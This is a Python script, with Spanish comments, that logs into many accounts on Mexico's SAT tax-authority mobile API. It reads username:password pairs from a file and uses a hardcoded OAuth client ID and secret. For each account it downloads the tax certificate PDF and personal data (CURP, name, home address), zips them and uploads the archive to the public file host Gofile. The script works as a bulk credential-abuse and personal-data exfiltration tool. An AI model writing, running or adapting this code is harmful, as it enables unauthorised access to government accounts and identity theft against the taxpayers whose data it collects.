import requests
import base64
import os
import zipfile

CLIENT_ID = "fe7bad7c-6dea-4834-8f40-1fa99620613b"
CLIENT_SECRET = "vhHgI-1N39KVvVK8itaGr7odbrTKnBdbwt4n7PoYHOlo6Fb9pnLXZNWwuGnUj-zijmumfWOGUhlaLer8LACwNA"

def run():
    if not os.path.exists("usuarios.txt"):
        print("? Error: No existe usuarios.txt")
        return

    os.makedirs("PDFS_SAT", exist_ok=True)
    session = requests.Session()
    reporte_txt = "=== REPORTE DETALLADO DE CAPTURAS ===\n\n"

    with open("usuarios.txt", "r") as f:
        usuarios = [line.strip() for line in f if ":" in line]

    for usuario in usuarios:
        rfc, pwd = usuario.split(":")
        rfc = rfc.upper().strip()
        print(f"?? Procesando: {rfc}")

        # 1. AUTENTICACIÓN
        token_url = f"https://login.cloudb.sat.gob.mx/nidp/oauth/nam/token?grant_type=password&client_id={CLIENT_ID}&client_secret={CLIENT_SECRET}&username={rfc}&password={pwd}&scope=satmovil&resourceServer=satmovil"
        try:
            r_auth = session.post(token_url)
            token = r_auth.json().get("access_token")
            
            if not token:
                print(f"  [!] Falló login para {rfc}")
                continue

            headers = {"Authorization": f"bearer {token}", "User-Agent": "Dart/3.5 (dart:io)"}

            # 2. DESCARGA DE PDF
            res_pdf = session.get(f"https://sm-sat-movilzuul-sm-servicios-moviles.cnh.cloudb.sat.gob.mx/satmovil/v1/csf/{rfc}", headers=headers)
            pdf_data = res_pdf.json().get("constancia")
            if pdf_data:
                with open(f"PDFS_SAT/{rfc}.pdf", "wb") as f_pdf:
                    f_pdf.write(base64.b64decode(pdf_data))
                print(f"  [+] PDF Guardado")

            # 3. CAPTURA DE INFORMACIÓN COMPLETA
            res_info = session.get(f"https://sm-sat-movilzuul-sm-servicios-moviles.cnh.cloudb.sat.gob.mx/satmovil/v1/dwh/miinformacion/{rfc}", headers=headers)
            info = res_info.json()

            # Mismo orden que tu script original
            datos = (
                f"RFC: {rfc}\n"
                f"NOMBRE: {info.get('tradename', 'N/A')}\n"
                f"CURP: {info.get('curp', 'N/A')}\n"
                f"DIRECCIÓN: {info.get('street', '')} #{info.get('numExterior', '')}, Col. {info.get('colonia', '')}, CP: {info.get('zipcode', '')}\n"
                f"LOCALIDAD: {info.get('municipio', '')}, {info.get('descriptionFederal', '')}\n"
                f"STATUS: {info.get('statusDescription', 'N/A')}\n"
                f"-------------------------------------------\n"
            )
            reporte_txt += datos

        except Exception as e:
            print(f"  [!] Error en {rfc}: {e}")

    # 4. CREAR ZIP Y SUBIR
    with open("REPORTE_CAPTURAS.txt", "w", encoding="utf-8") as f_rep:
        f_rep.write(reporte_txt)

    zip_name = "TODO_SAT.zip"
    with zipfile.ZipFile(zip_name, 'w') as zipf:
        zipf.write("REPORTE_CAPTURAS.txt")
        for arch in os.listdir("PDFS_SAT"):
            zipf.write(f"PDFS_SAT/{arch}", f"PDFS/{arch}")

    print("\n?? Subiendo todo a Gofile...")
    server = requests.get("https://api.gofile.io/servers").json()["data"]["servers"][0]["name"]
    with open(zip_name, "rb") as f_zip:
        up = requests.post(f"https://{server}.gofile.io/contents/uploadfile", files={"file": f_zip}).json()
    
    print(f"\n? TERMINADO CON ÉXITO")
    print(f"?? LINK GOFILE: {up['data']['downloadPage']}")

if __name__ == "__main__":
    run()
